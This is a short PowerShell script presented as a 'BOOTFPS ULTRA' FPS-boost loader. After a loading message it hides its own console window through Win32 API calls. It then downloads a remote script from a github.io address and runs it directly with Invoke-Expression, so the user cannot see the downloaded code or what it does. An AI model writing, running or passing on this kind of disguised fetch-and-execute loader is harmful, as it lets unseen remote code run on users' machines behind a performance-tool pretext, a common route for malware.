# ===================================
# BOOTFPS ULTRA WEB LOADER
# ===================================

$Host.UI.RawUI.WindowTitle = "BOOTFPS ULTRA WEB"

Write-Host ""
Write-Host "BOOTFPS ULTRA LOADING..." -ForegroundColor Cyan
Start-Sleep 2

# Hide Window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# Download Ultra Script
$scriptURL = "https://truffles3300.github.io/kobmaidai/ultra.ps1"

Invoke-Expression (Invoke-RestMethod $scriptURL)